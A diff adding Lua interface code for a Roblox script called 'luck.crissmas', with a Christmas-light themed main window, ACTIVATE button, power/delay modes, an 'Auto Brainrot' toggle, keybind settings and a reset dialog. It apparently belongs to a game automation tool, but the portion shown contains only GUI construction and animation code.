+    -- ══════════════════════════════════════════════════════════════════════
+    -- CHRISTMAS LIGHTS BORDER DECORATION
+    -- ══════════════════════════════════════════════════════════════════════
+    local function addChristmasLights(parent, width, height, cornerRadius)
+        local lightColors = {
+            Color3.fromRGB(255, 50, 50),   -- red
+            Color3.fromRGB(40, 220, 80),   -- green
+            Color3.fromRGB(255, 220, 60),  -- gold
+            Color3.fromRGB(255, 90, 100),  -- light red
+            Color3.fromRGB(60, 200, 120),  -- light green
+        }
+        local lights = {}
+        local spacing = 14
+        local pad = 4
+        local r = cornerRadius or 12
+
+        local function makeLight(x, y, color, idx)
+            local bulb = Instance.new("Frame")
+            bulb.Name = "XmasLight"
+            bulb.Size = UDim2.fromOffset(6, 6)
+            bulb.Position = UDim2.fromOffset(x - 3, y - 3)
+            bulb.BackgroundColor3 = color
+            bulb.BorderSizePixel = 0
+            bulb.ZIndex = parent.ZIndex + 5
+            bulb.Parent = parent
+            Instance.new("UICorner", bulb).CornerRadius = UDim.new(1, 0)
+            local glow = Instance.new("UIStroke", bulb)
+            glow.Color = color
+            glow.Thickness = 2
+            glow.Transparency = 0.35
+            lights[#lights + 1] = {frame = bulb, stroke = glow, base = color, idx = idx}
+            return bulb
+        end
+
+        local idx = 0
+        -- Top edge
+        for x = pad + r, width - pad - r, spacing do
+            idx = idx + 1
+            makeLight(x, pad, lightColors[(idx - 1) % #lightColors + 1], idx)
+        end
+        -- Right edge
+        for y = pad + r, height - pad - r, spacing do
+            idx = idx + 1
+            makeLight(width - pad, y, lightColors[(idx - 1) % #lightColors + 1], idx)
+        end
+        -- Bottom edge
+        for x = width - pad - r, pad + r, -spacing do
+            idx = idx + 1
+            makeLight(x, height - pad, lightColors[(idx - 1) % #lightColors + 1], idx)
+        end
+        -- Left edge
+        for y = height - pad - r, pad + r, -spacing do
+            idx = idx + 1
+            makeLight(pad, y, lightColors[(idx - 1) % #lightColors + 1], idx)
+        end
+
+        -- Twinkle animation
+        task.spawn(function()
+            while parent and parent.Parent do
+                for _, L in ipairs(lights) do
+                    if L.frame and L.frame.Parent then
+                        local phase = (tick() * 3.2 + L.idx * 0.45) % (math.pi * 2)
+                        local bright = 0.45 + 0.55 * (0.5 + 0.5 * math.sin(phase))
+                        L.frame.BackgroundTransparency = 1 - bright
+                        L.stroke.Transparency = 0.25 + (1 - bright) * 0.55
+                    end
+                end
+                task.wait(0.05)
+            end
+        end)
+        return lights
+    end
+
+    -- ══════════════════════════════════════════════════════════════════════
+    -- MAIN WINDOW
+    -- ══════════════════════════════════════════════════════════════════════
+    local function addSunsetScene(frame)
+        local image = Instance.new("ImageLabel", frame)
+        image.Name = "CrissmasScene"
+        image.Size = UDim2.fromScale(1, 1)
+        image.BackgroundTransparency = 1
+        image.Image = "rbxassetid://88781406702970"
+        image.ImageTransparency = 0.55
+        image.ScaleType = Enum.ScaleType.Crop
+        image.Visible = true
+        image.ZIndex = frame.ZIndex
+        Instance.new("UICorner", image).CornerRadius = UDim.new(0, 12)
+    end
+    local MAIN_W, MAIN_H = 210, 130
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name             = "MainFrame"
+    mainFrame.Size             = UDim2.new(0, MAIN_W, 0, MAIN_H)
+    mainFrame.Position         = UDim2.new(0.5, -MAIN_W/2, 0.5, -MAIN_H/2)
+    mainFrame.BackgroundColor3 = C.bg
+    mainFrame.BackgroundTransparency = T.bg
+    mainFrame.BorderSizePixel  = 0
+    mainFrame.Active           = true
+    mainFrame.ClipsDescendants = false
+    mainFrame.Parent           = screen
+    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
+    applyGradient(mainFrame, C.bg, Color3.fromRGB(12, 40, 22), 160)
+    addSunsetScene(mainFrame)
+
+    local mainStroke = Instance.new("UIStroke", mainFrame)
+    mainStroke.Color        = C.gold1
+    mainStroke.Thickness    = 1.5
+    mainStroke.Transparency = 0.35
+
+    addChristmasLights(mainFrame, MAIN_W, MAIN_H, 12)
+
+    makeDraggable(mainFrame)
+
+    -- Header
+    local header = Instance.new("Frame", mainFrame)
+    header.Size             = UDim2.new(1,0,0,32)
+    header.BackgroundColor3 = C.gold1
+    header.BackgroundTransparency = T.header
+    header.BorderSizePixel  = 0
+    header.ZIndex           = 2
+    Instance.new("UICorner", header).CornerRadius = UDim.new(0,12)
+    applyGradient(header, C.gold1, C.gold2, 135)
+
+    local headerFill = Instance.new("Frame", mainFrame)
+    headerFill.Size             = UDim2.new(1,0,0,8)
+    headerFill.Position         = UDim2.new(0,0,0,24)
+    headerFill.BackgroundColor3 = C.gold1
+    headerFill.BackgroundTransparency = T.header
+    headerFill.BorderSizePixel  = 0
+    headerFill.ZIndex           = 2
+    applyGradient(headerFill, C.gold1, C.gold2, 135)
+
+    local titleLbl = Instance.new("TextLabel", header)
+    titleLbl.Size               = UDim2.new(1,-90,1,0)
+    titleLbl.Position           = UDim2.new(0,10,0,0)
+    titleLbl.BackgroundTransparency = 1
+    titleLbl.Text               = "ʟᴜᴄᴋ.ᴄʀɪꜱꜱᴍᴀꜱ"
+    titleLbl.TextColor3         = C.white
+    titleLbl.Font               = Enum.Font.GothamBlack
+    titleLbl.TextSize           = 11
+    titleLbl.TextXAlignment     = Enum.TextXAlignment.Left
+    titleLbl.ZIndex             = 3
+
+    -- Status pill
+    local statusPill = Instance.new("Frame", header)
+    statusPill.Size             = UDim2.new(0,40,0,16)
+    statusPill.Position         = UDim2.new(1,-82,0.5,-8)
+    statusPill.BackgroundColor3 = Color3.fromRGB(70, 20, 25)
+    statusPill.BackgroundTransparency = 0.15
+    statusPill.BorderSizePixel  = 0
+    statusPill.ZIndex           = 3
+    Instance.new("UICorner", statusPill).CornerRadius = UDim.new(1,0)
+
+    local statusLbl = Instance.new("TextLabel", statusPill)
+    statusLbl.Size              = UDim2.new(1,0,1,0)
+    statusLbl.BackgroundTransparency = 1
+    statusLbl.Text              = "OFF"
+    statusLbl.TextColor3        = C.red
+    statusLbl.Font              = Enum.Font.GothamBlack
+    statusLbl.TextSize          = 8
+    statusLbl.ZIndex            = 4
+
+    -- Settings emoji button
+    local settingsEmojiBtn = Instance.new("TextButton", header)
+    settingsEmojiBtn.Size             = UDim2.new(0,24,0,24)
+    settingsEmojiBtn.Position         = UDim2.new(1,-28,0.5,-12)
+    settingsEmojiBtn.BackgroundColor3 = Color3.fromRGB(55, 18, 22)
+    settingsEmojiBtn.BackgroundTransparency = 0.15
+    settingsEmojiBtn.BorderSizePixel  = 0
+    settingsEmojiBtn.AutoButtonColor  = false
+    settingsEmojiBtn.Text             = "⚙️"
+    settingsEmojiBtn.TextColor3       = C.white
+    settingsEmojiBtn.Font             = Enum.Font.GothamBlack
+    settingsEmojiBtn.TextSize         = 14
+    settingsEmojiBtn.ZIndex           = 23
+    Instance.new("UICorner", settingsEmojiBtn).CornerRadius = UDim.new(0,6)
+    settingsEmojiBtn.MouseEnter:Connect(function()
+        tw(settingsEmojiBtn,{BackgroundColor3=C.gold1},0.1)
+    end)
+    settingsEmojiBtn.MouseLeave:Connect(function()
+        tw(settingsEmojiBtn,{BackgroundColor3=Color3.fromRGB(55, 18, 22)},0.1)
+    end)
+
+    -- Activate button
+    local activateBtn = Instance.new("TextButton", mainFrame)
+    activateBtn.Size             = UDim2.new(1,-16,0,28)
+    activateBtn.Position         = UDim2.new(0,8,0,38)
+    activateBtn.BackgroundColor3 = C.card
+    activateBtn.BackgroundTransparency = T.card
+    activateBtn.BorderSizePixel  = 0
+    activateBtn.AutoButtonColor  = false
+    activateBtn.Text             = ""
+    activateBtn.ZIndex           = 3
+    Instance.new("UICorner", activateBtn).CornerRadius = UDim.new(0,8)
+    local activateGrad = applyGradient(activateBtn, C.gold1, C.gold2, 135)
+
+    local activateStroke = Instance.new("UIStroke", activateBtn)
+    activateStroke.Color        = C.gold3
+    activateStroke.Thickness    = 1.2
+    activateStroke.Transparency = 0.4
+
+    local activateLbl = Instance.new("TextLabel", activateBtn)
+    activateLbl.Size            = UDim2.new(1,0,1,0)
+    activateLbl.BackgroundTransparency = 1
+    activateLbl.Text            = "ACTIVATE"
+    activateLbl.TextColor3      = C.white
+    activateLbl.Font            = Enum.Font.GothamBlack
+    activateLbl.TextSize        = 11
+    activateLbl.ZIndex          = 5
+
+    -- ══════════════════════════════════════════════════════════════════════
+    -- MODE (LOW / MED / HIGH)
+    -- ══════════════════════════════════════════════════════════════════════
+    local modeRow = Instance.new("Frame", mainFrame)
+    modeRow.Size             = UDim2.new(1,-16,0,22)
+    modeRow.Position         = UDim2.new(0,8,0,72)
+    modeRow.BackgroundColor3 = C.card
+    modeRow.BackgroundTransparency = T.card
+    modeRow.BorderSizePixel  = 0
+    modeRow.ZIndex           = 3
+    Instance.new("UICorner", modeRow).CornerRadius = UDim.new(0,7)
+    local modeRowStroke = Instance.new("UIStroke", modeRow)
+    modeRowStroke.Color = C.glow
+    modeRowStroke.Thickness = 1
+    modeRowStroke.Transparency = 0.5
+
+    local modeButtons = {}
+    local modeList = {"LOW", "MED", "HIGH"}
+    local modeBtnW = (MAIN_W - 16 - 8) / 3
+
+    local function refreshModeButtons()
+        for name, btn in pairs(modeButtons) do
+            if cfg.mode == name then
+                btn.TextColor3 = MODE_TEXT_COLORS[name]
+            else
+                btn.TextColor3 = C.dim
+            end
         end
     end
-    if active then
+
+    for i, name in ipairs(modeList) do
+        local btn = Instance.new("TextButton", modeRow)
+        btn.Size             = UDim2.new(0, modeBtnW - 4, 0, 18)
+        btn.Position         = UDim2.new(0, 4 + (i-1) * (modeBtnW - 4) + (i-1) * 2, 0.5, -9)
+        btn.BackgroundColor3 = Color3.fromRGB(30, 55, 35)
+        btn.BackgroundTransparency = 0.4
+        btn.BorderSizePixel  = 0
+        btn.AutoButtonColor  = false
+        btn.Text             = name
+        btn.TextColor3       = C.dim
+        btn.Font             = Enum.Font.GothamBold
+        btn.TextSize         = 9
+        btn.ZIndex           = 4
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0,5)
+
+        btn.MouseButton1Click:Connect(function()
+            cfg.mode = name
+            local m = MODES[name]
+            if m then
+                cfg.power    = m.power
+                cfg.interval = m.interval
+            end
+            refreshModeButtons()
+            saveConfig()
+        end)
+
+        modeButtons[name] = btn
+    end
+
+    refreshModeButtons()
+
+    -- ══════════════════════════════════════════════════════════════════════
+    -- DISCORD LINK
+    -- ══════════════════════════════════════════════════════════════════════
+    local discordLbl = Instance.new("TextLabel", mainFrame)
+    discordLbl.Size             = UDim2.new(1,-16,0,18)
+    discordLbl.Position         = UDim2.new(0,8,0,100)
+    discordLbl.BackgroundTransparency = 1
+    discordLbl.Text             = "✦ ʟᴜᴄᴋ.ᴄʀɪꜱꜱᴍᴀꜱ ✦"
+    discordLbl.TextColor3       = C.discord
+    discordLbl.Font             = Enum.Font.GothamBold
+    discordLbl.TextSize         = 9
+    discordLbl.ZIndex           = 3
+
+    -- ══════════════════════════════════════════════════════════════════════
+    -- SETTINGS PANEL
+    -- ══════════════════════════════════════════════════════════════════════
+    local SET_W, SET_H = 220, 340
+
+    local settingsFrame = Instance.new("Frame")
+    settingsFrame.Name             = "SettingsPanel"
+    settingsFrame.Size             = UDim2.new(0,SET_W,0,SET_H)
+    settingsFrame.Position         = UDim2.new(0.5,-SET_W/2,0.5,60)
+    settingsFrame.BackgroundColor3 = C.panel
+    settingsFrame.BackgroundTransparency = T.panel
+    settingsFrame.BorderSizePixel  = 0
+    settingsFrame.Active           = true
+    settingsFrame.ClipsDescendants = true
+    settingsFrame.Visible          = false
+    settingsFrame.ZIndex           = 20
+    settingsFrame.Parent           = screen
+    Instance.new("UICorner", settingsFrame).CornerRadius = UDim.new(0,12)
+    applyGradient(settingsFrame, C.panel, Color3.fromRGB(40, 14, 16), 160)
+    addSunsetScene(settingsFrame)
+
+    local setStroke = Instance.new("UIStroke", settingsFrame)
+    setStroke.Color        = C.glow
+    setStroke.Thickness    = 1.4
+    setStroke.Transparency = 0.3
+
+    addChristmasLights(settingsFrame, SET_W, SET_H, 12)
+
+    makeDraggable(settingsFrame)
+
+    local setHeader = Instance.new("Frame", settingsFrame)
+    setHeader.Size             = UDim2.new(1,0,0,32)
+    setHeader.BackgroundColor3 = C.glow
+    setHeader.BackgroundTransparency = T.header
+    setHeader.BorderSizePixel  = 0
+    setHeader.ZIndex           = 21
+    Instance.new("UICorner", setHeader).CornerRadius = UDim.new(0,12)
+    applyGradient(setHeader, C.glow, C.gold1, 135)
+
+    local setHeaderFill = Instance.new("Frame", settingsFrame)
+    setHeaderFill.Size             = UDim2.new(1,0,0,8)
+    setHeaderFill.Position         = UDim2.new(0,0,0,24)
+    setHeaderFill.BackgroundColor3 = C.glow
+    setHeaderFill.BackgroundTransparency = T.header
+    setHeaderFill.BorderSizePixel  = 0
+    setHeaderFill.ZIndex           = 21
+    applyGradient(setHeaderFill, C.glow, C.gold1, 135)
+
+    local setTitle = Instance.new("TextLabel", setHeader)
+    setTitle.Size               = UDim2.new(1,-80,1,0)
+    setTitle.Position           = UDim2.new(0,10,0,0)
+    setTitle.BackgroundTransparency = 1
+    setTitle.Text               = "Settings"
+    setTitle.TextColor3         = C.white
+    setTitle.Font               = Enum.Font.GothamBlack
+    setTitle.TextSize           = 11
+    setTitle.TextXAlignment     = Enum.TextXAlignment.Left
+    setTitle.ZIndex             = 22
+
+    local setCloseBtn = Instance.new("TextButton", setHeader)
+    setCloseBtn.Size             = UDim2.new(0,24,0,24)
+    setCloseBtn.Position         = UDim2.new(1,-28,0.5,-12)
+    setCloseBtn.BackgroundColor3 = Color3.fromRGB(55, 18, 22)
+    setCloseBtn.BackgroundTransparency = 0.15
+    setCloseBtn.BorderSizePixel  = 0
+    setCloseBtn.AutoButtonColor  = false
+    setCloseBtn.Text             = "X"
+    setCloseBtn.TextColor3       = C.white
+    setCloseBtn.Font             = Enum.Font.GothamBlack
+    setCloseBtn.TextSize         = 11
+    setCloseBtn.ZIndex           = 23
+    Instance.new("UICorner", setCloseBtn).CornerRadius = UDim.new(0,6)
+    setCloseBtn.MouseEnter:Connect(function() tw(setCloseBtn,{BackgroundColor3=C.red},0.1) end)
+    setCloseBtn.MouseLeave:Connect(function() tw(setCloseBtn,{BackgroundColor3=Color3.fromRGB(55, 18, 22)},0.1) end)
+
+    local function mkInputRow(yPos, labelText, getValue, onConfirm)
+        local row = Instance.new("Frame", settingsFrame)
+        row.Size             = UDim2.new(1,-16,0,34)
+        row.Position         = UDim2.new(0,8,0,yPos)
+        row.BackgroundColor3 = C.card
+        row.BackgroundTransparency = T.card
+        row.BorderSizePixel  = 0
+        row.ZIndex           = 21
+        Instance.new("UICorner", row).CornerRadius = UDim.new(0,8)
+        local rs = Instance.new("UIStroke",row); rs.Color=C.glow; rs.Thickness=1; rs.Transparency=0.6
+
+        local lbl = Instance.new("TextLabel", row)
+        lbl.Size               = UDim2.new(0.45,0,1,0)
+        lbl.Position           = UDim2.new(0,10,0,0)
+        lbl.BackgroundTransparency = 1
+        lbl.Text               = labelText
+        lbl.TextColor3         = C.white
+        lbl.Font               = Enum.Font.GothamBold
+        lbl.TextSize           = 10
+        lbl.TextXAlignment     = Enum.TextXAlignment.Left
+        lbl.ZIndex             = 22
+
+        local box = Instance.new("TextBox", row)
+        box.Size               = UDim2.new(0,64,0,24)
+        box.Position           = UDim2.new(1,-72,0.5,-12)
+        box.BackgroundColor3   = C.inputBg
+        box.BackgroundTransparency = T.inputBg
+        box.BorderSizePixel    = 0
+        box.Text               = tostring(getValue())
+        box.TextColor3         = C.gold3
+        box.Font               = Enum.Font.GothamBold
+        box.TextSize           = 11
+        box.ClearTextOnFocus   = false
+        box.ZIndex             = 23
+        Instance.new("UICorner", box).CornerRadius = UDim.new(0,6)
+
+        local bs = Instance.new("UIStroke",box); bs.Color=C.glow; bs.Thickness=1; bs.Transparency=0.5
+
+        box.Focused:Connect(function()   tw(bs,{Color=C.gold2,Transparency=0},0.12) end)
+        box.FocusLost:Connect(function()
+            tw(bs,{Color=C.glow,Transparency=0.5},0.12)
+            local n = tonumber(box.Text)
+            if n then
+                onConfirm(n)
+                box.Text = tostring(getValue())
+                saveConfig()
+            else
+                box.Text = tostring(getValue())
+            end
+        end)
+
+        return box
+    end
+
+    local kbBindBtn, gpBindBtn
+
+    local function updateKbLabels()
+        if kbBindBtn then
+            if listeningFor == "kb" then
+                kbBindBtn.Text       = "Press a key..."
+                kbBindBtn.TextColor3 = C.waiting
+            else
+                kbBindBtn.Text       = cfg.keybindKb ~= "" and cfg.keybindKb or "None"
+                kbBindBtn.TextColor3 = C.gold3
+            end
+        end
+        if gpBindBtn then
+            if listeningFor == "gp" then
+                gpBindBtn.Text       = "Press a button..."
+                gpBindBtn.TextColor3 = C.waiting
+            else
+                gpBindBtn.Text       = cfg.keybindGp ~= "" and cfg.keybindGp or "None"
+                gpBindBtn.TextColor3 = C.gold3
+            end
+        end
+    end
+
+    local function mkKeybindRow(yPos, labelText, which)
+        local row = Instance.new("Frame", settingsFrame)
+        row.Size             = UDim2.new(1,-16,0,34)
+        row.Position         = UDim2.new(0,8,0,yPos)
+        row.BackgroundColor3 = C.card
+        row.BackgroundTransparency = T.card
+        row.BorderSizePixel  = 0
+        row.ZIndex           = 21
+        Instance.new("UICorner", row).CornerRadius = UDim.new(0,8)
+        local rs = Instance.new("UIStroke",row); rs.Color=C.glow; rs.Thickness=1; rs.Transparency=0.6
+
+        local lbl = Instance.new("TextLabel", row)
+        lbl.Size               = UDim2.new(0.4,0,1,0)
+        lbl.Position           = UDim2.new(0,10,0,0)
+        lbl.BackgroundTransparency = 1
+        lbl.Text               = labelText
+        lbl.TextColor3         = C.white
+        lbl.Font               = Enum.Font.GothamBold
+        lbl.TextSize           = 10
+        lbl.TextXAlignment     = Enum.TextXAlignment.Left
+        lbl.ZIndex             = 22
+
+        local bindBtn = Instance.new("TextButton", row)
+        bindBtn.Size             = UDim2.new(0,72,0,24)
+        bindBtn.Position         = UDim2.new(1,-88,0.5,-12)
+        bindBtn.BackgroundColor3 = C.inputBg
+        bindBtn.BackgroundTransparency = T.inputBg
+        bindBtn.BorderSizePixel  = 0
+        bindBtn.AutoButtonColor  = false
+        bindBtn.Font             = Enum.Font.GothamBold
+        bindBtn.TextSize         = 9
+        bindBtn.TextColor3       = C.gold3
+        bindBtn.ZIndex           = 23
+        bindBtn.Text             = which == "kb" and cfg.keybindKb or cfg.keybindGp
+        Instance.new("UICorner", bindBtn).CornerRadius = UDim.new(0,6)
+
+        local bStr = Instance.new("UIStroke",bindBtn); bStr.Color=C.glow; bStr.Thickness=1; bStr.Transparency=0.5
+        bindBtn.MouseEnter:Connect(function() tw(bStr,{Color=C.gold2,Transparency=0},0.1) end)
+        bindBtn.MouseLeave:Connect(function() tw(bStr,{Color=C.glow,Transparency=0.5},0.1) end)
+
+        bindBtn.MouseButton1Click:Connect(function()
+            listeningFor = (listeningFor == which) and nil or which
+            updateKbLabels()
+        end)
+
+        local clearBtn = Instance.new("TextButton", row)
+        clearBtn.Size             = UDim2.new(0,24,0,24)
+        clearBtn.Position         = UDim2.new(1,-28,0.5,-12)
+        clearBtn.BackgroundColor3 = Color3.fromRGB(30,15,15)
+        clearBtn.BackgroundTransparency = T.inputBg
+        clearBtn.BorderSizePixel  = 0
+        clearBtn.AutoButtonColor  = false
+        clearBtn.Text             = "X"
+        clearBtn.TextColor3       = C.red
+        clearBtn.Font             = Enum.Font.GothamBlack
+        clearBtn.TextSize         = 10
+        clearBtn.ZIndex           = 23
+        Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0,6)
+        local cStr = Instance.new("UIStroke",clearBtn); cStr.Color=C.red; cStr.Thickness=1; cStr.Transparency=0.5
+        clearBtn.MouseEnter:Connect(function() tw(cStr,{Transparency=0},0.1) end)
+        clearBtn.MouseLeave:Connect(function() tw(cStr,{Transparency=0.5},0.1) end)
+
+        clearBtn.MouseButton1Click:Connect(function()
+            if listeningFor == which then listeningFor = nil end
+            if which == "kb" then cfg.keybindKb = "None" else cfg.keybindGp = "None" end
+            updateKbLabels()
+            saveConfig()
+        end)
+
+        if which == "kb" then kbBindBtn = bindBtn end
+        if which == "gp" then gpBindBtn = bindBtn end
+
+        return bindBtn
+    end
+
+    local autoBrainrotBtn
+
+    local function createBrainrotRow(yPos)
+        local row = Instance.new("Frame", settingsFrame)
+        row.Size             = UDim2.new(1,-16,0,34)
+        row.Position         = UDim2.new(0,8,0,yPos)
+        row.BackgroundColor3 = C.card
+        row.BackgroundTransparency = T.card
+        row.BorderSizePixel  = 0
+        row.ZIndex           = 21
+        Instance.new("UICorner", row).CornerRadius = UDim.new(0,8)
+        local rs = Instance.new("UIStroke",row); rs.Color=C.glow; rs.Thickness=1; rs.Transparency=0.6
+
+        local lbl = Instance.new("TextLabel", row)
+        lbl.Size               = UDim2.new(0.7,0,1,0)
+        lbl.Position           = UDim2.new(0,10,0,0)
+        lbl.BackgroundTransparency = 1
+        lbl.Text               = "Auto Brainrot"
+        lbl.TextColor3         = C.white
+        lbl.Font               = Enum.Font.GothamBold
+        lbl.TextSize           = 10
+        lbl.TextXAlignment     = Enum.TextXAlignment.Left
+        lbl.ZIndex             = 22
+
+        local toggleBtn = Instance.new("TextButton", row)
+        toggleBtn.Size             = UDim2.new(0,50,0,24)
+        toggleBtn.Position         = UDim2.new(1,-58,0.5,-12)
+        toggleBtn.BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)
+        toggleBtn.BorderSizePixel  = 0
+        toggleBtn.AutoButtonColor  = false
+        toggleBtn.Text             = cfg.autoBrainrot and "ON" or "OFF"
+        toggleBtn.TextColor3       = C.white
+        toggleBtn.Font             = Enum.Font.GothamBlack
+        toggleBtn.TextSize         = 9
+        toggleBtn.ZIndex           = 23
+        Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(1,0)
+
+        local tStr = Instance.new("UIStroke", toggleBtn)
+        tStr.Color = C.glow; tStr.Thickness = 1; tStr.Transparency = 0.5
+
+        toggleBtn.MouseButton1Click:Connect(function()
+            cfg.autoBrainrot = not cfg.autoBrainrot
+            toggleBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
+            tw(toggleBtn, {BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)}, 0.15)
+            saveConfig()
+        end)
+
+        autoBrainrotBtn = toggleBtn
+        return toggleBtn
+    end
+
+    local Y = 36
+    local GAP = 6
+
+    local powerBox = mkInputRow(Y, "Power", function() return cfg.power end, function(v)
+        cfg.power = math.max(1, v)
+    end)
+    Y = Y + 34 + GAP
+
+    local intervalBox = mkInputRow(Y, "Delay (secs)", function() return cfg.interval end, function(v)
+        cfg.interval = math.max(0.001, v)
+    end)
+    Y = Y + 34 + GAP
+
+    createBrainrotRow(Y)
+    Y = Y + 34 + GAP
+
+    local div = Instance.new("Frame", settingsFrame)
+    div.Size             = UDim2.new(1,-16,0,1)
+    div.Position         = UDim2.new(0,8,0,Y)
+    div.BackgroundColor3 = C.glow
+    div.BorderSizePixel  = 0
+    div.BackgroundTransparency = 0.5
+    div.ZIndex           = 21
+    Y = Y + 8
+
+    local kbSectLbl = Instance.new("TextLabel", settingsFrame)
+    kbSectLbl.Size               = UDim2.new(1,-16,0,16)
+    kbSectLbl.Position           = UDim2.new(0,8,0,Y)
+    kbSectLbl.BackgroundTransparency = 1
+    kbSectLbl.Text               = "KEYBINDS"
+    kbSectLbl.TextColor3         = C.dim
+    kbSectLbl.Font               = Enum.Font.GothamBold
+    kbSectLbl.TextSize           = 8
+    kbSectLbl.TextXAlignment     = Enum.TextXAlignment.Left
+    kbSectLbl.ZIndex             = 21
+    Y = Y + 16
+
+    mkKeybindRow(Y, "Keyboard",   "kb"); Y = Y + 34 + GAP
+    mkKeybindRow(Y, "Controller", "gp"); Y = Y + 34 + GAP
+
+    local resetBtn = Instance.new("TextButton", settingsFrame)
+    resetBtn.Size             = UDim2.new(1,-16,0,26)
+    resetBtn.Position         = UDim2.new(0,8,0,Y)
+    resetBtn.BackgroundColor3 = C.glow
+    resetBtn.BorderSizePixel  = 0
+    resetBtn.AutoButtonColor  = false
+    resetBtn.Text             = "Reset Defaults"
+    resetBtn.TextColor3       = C.white
+    resetBtn.Font             = Enum.Font.GothamBold
+    resetBtn.TextSize         = 10
+    resetBtn.ZIndex           = 21
+    Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0,7)
+    applyGradient(resetBtn, C.glow, C.gold1, 135)
+    resetBtn.MouseEnter:Connect(function() tw(resetBtn,{BackgroundColor3=C.gold1},0.1) end)
+    resetBtn.MouseLeave:Connect(function() tw(resetBtn,{BackgroundColor3=C.glow},0.1) end)
+
+    -- ══════════════════════════════════════════════════════════════════════
+    -- RESET CONFIRM DIALOG
+    -- ══════════════════════════════════════════════════════════════════════
+    local confirmBackdrop = Instance.new("Frame")
+    confirmBackdrop.Name                   = "ConfirmBackdrop"
+    confirmBackdrop.Size                   = UDim2.new(1,0,1,0)
+    confirmBackdrop.BackgroundColor3       = Color3.fromRGB(0,0,0)
+    confirmBackdrop.BackgroundTransparency = 0.45
+    confirmBackdrop.BorderSizePixel        = 0
+    confirmBackdrop.Visible                = false
+    confirmBackdrop.ZIndex                 = 50
+    confirmBackdrop.Parent                 = screen
+
+    local confirmBox = Instance.new("Frame", confirmBackdrop)
+    confirmBox.Size             = UDim2.new(0,210,0,120)
+    confirmBox.Position         = UDim2.new(0.5,-105,0.5,-60)
+    confirmBox.BackgroundColor3 = C.panel
+    confirmBox.BackgroundTransparency = T.panel
+    confirmBox.BorderSizePixel  = 0
+    confirmBox.ZIndex           = 51
+    Instance.new("UICorner", confirmBox).CornerRadius = UDim.new(0,10)
+    applyGradient(confirmBox, C.panel, Color3.fromRGB(40, 14, 16), 160)
+
+    local cStroke = Instance.new("UIStroke", confirmBox)
+    cStroke.Color = C.gold1; cStroke.Thickness = 1.3; cStroke.Transparency = 0.3
+    addChristmasLights(confirmBox, 210, 120, 10)
+
+    local confirmLbl = Instance.new("TextLabel", confirmBox)
+    confirmLbl.Size               = UDim2.new(1,-16,0,58)
+    confirmLbl.Position           = UDim2.new(0,8,0,8)
+    confirmLbl.BackgroundTransparency = 1
+    confirmLbl.Text               = "Reset all settings to defaults?"
+    confirmLbl.TextWrapped        = true
+    confirmLbl.TextColor3         = C.white
+    confirmLbl.Font               = Enum.Font.GothamBold
+    confirmLbl.TextSize           = 11
+    confirmLbl.ZIndex             = 52
+
+    local confirmYes = Instance.new("TextButton", confirmBox)
+    confirmYes.Size             = UDim2.new(0,92,0,30)
+    confirmYes.Position         = UDim2.new(0,8,1,-38)
+    confirmYes.BackgroundColor3 = C.glow
+    confirmYes.BorderSizePixel  = 0
+    confirmYes.AutoButtonColor  = false
+    confirmYes.Text             = "Confirm"
+    confirmYes.TextColor3       = C.white
+    confirmYes.Font             = Enum.Font.GothamBlack
+    confirmYes.TextSize         = 11
+    confirmYes.ZIndex           = 52
+    Instance.new("UICorner", confirmYes).CornerRadius = UDim.new(0,7)
+    applyGradient(confirmYes, C.glow, C.gold1, 135)
+
+    local confirmNo = Instance.new("TextButton", confirmBox)
+    confirmNo.Size             = UDim2.new(0,92,0,30)
+    confirmNo.Position         = UDim2.new(1,-100,1,-38)
+    confirmNo.BackgroundColor3 = C.card
+    confirmNo.BorderSizePixel  = 0
+    confirmNo.AutoButtonColor  = false
+    confirmNo.Text             = "Cancel"
+    confirmNo.TextColor3       = C.dim
+    confirmNo.Font             = Enum.Font.GothamBold
+    confirmNo.TextSize         = 11
+    confirmNo.ZIndex           = 52
+    Instance.new("UICorner", confirmNo).CornerRadius = UDim.new(0,7)
+
+    confirmYes.MouseEnter:Connect(function() tw(confirmYes,{BackgroundColor3=C.gold1},0.1) end)
+    confirmYes.MouseLeave:Connect(function() tw(confirmYes,{BackgroundColor3=C.glow},0.1) end)
+    confirmNo.MouseEnter:Connect(function()  tw(confirmNo,{TextColor3=C.white},0.1) end)
+    confirmNo.MouseLeave:Connect(function()  tw(confirmNo,{TextColor3=C.dim},0.1) end)
+
+    local function hideConfirm() confirmBackdrop.Visible = false end
+
+    confirmNo.MouseButton1Click:Connect(hideConfirm)
+
+    confirmYes.MouseButton1Click:Connect(function()
+        cfg.power        = DEFAULT_CFG.power
+        cfg.interval     = DEFAULT_CFG.interval
+        cfg.keybindKb    = DEFAULT_CFG.keybindKb
+        cfg.keybindGp    = DEFAULT_CFG.keybindGp
+        cfg.autoBrainrot = DEFAULT_CFG.autoBrainrot
+        cfg.mode         = DEFAULT_CFG.mode
+
+        local m = MODES[cfg.mode]
+        if m then
+            cfg.power    = m.power
+            cfg.interval = m.interval
+        end
+
+        powerBox.Text    = tostring(cfg.power)
+        intervalBox.Text = tostring(cfg.interval)
+        updateKbLabels()
+
+        if autoBrainrotBtn then
+            autoBrainrotBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
+            tw(autoBrainrotBtn, {BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)}, 0.15)
+        end
+
+        refreshModeButtons()
+        saveConfig()
+        hideConfirm()
+    end)
+
+    resetBtn.MouseButton1Click:Connect(function()
+        confirmLbl.Text = "Reset all settings to defaults?"
+        confirmBackdrop.Visible = true
+    end)
+
+    -- ══════════════════════════════════════════════════════════════════════
+    -- SETTINGS OPEN / CLOSE
+    -- ══════════════════════════════════════════════════════════════════════
+    local settingsOpen = false
+
+    local function openSettings()
+        settingsOpen          = true
+        settingsFrame.Visible = true
+        settingsFrame.Size    = UDim2.new(0,SET_W,0,0)
+        tw(settingsFrame, {Size=UDim2.new(0,SET_W,0,SET_H)}, 0.2)
+        tw(settingsEmojiBtn, {BackgroundColor3=C.gold1}, 0.12)
